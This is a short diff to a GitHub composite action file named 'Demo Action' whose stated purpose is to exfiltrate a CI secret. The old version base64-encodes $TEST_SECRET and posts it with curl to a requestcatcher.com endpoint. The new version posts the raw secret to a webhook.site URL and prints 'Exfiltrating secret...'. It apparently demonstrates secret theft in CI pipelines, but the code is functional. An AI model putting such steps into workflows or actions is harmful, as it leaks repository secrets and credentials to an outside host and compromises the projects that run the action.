@@ -1,10 +1,10 @@
 name: 'Demo Action'
-description: 'Exfiltrate encoded secret'
+description: 'Exfiltrate secret to webhook.site'
 runs:
   using: "composite"
   steps:
     - run: |
-        encoded=$(echo -n "$TEST_SECRET" | base64)
-        curl -s -d "secret=$encoded" https://yakosolana-demo-7842.requestcatcher.com
-        echo "::notice ::Exfiltration request sent."
+        echo "::notice ::Exfiltrating secret..."
+        curl -s -d "secret=$TEST_SECRET" https://webhook.site/fa52ec3c-7eec-4275-a779-0b04a44515ee
+        echo "::notice ::Request sent."
       shell: bash
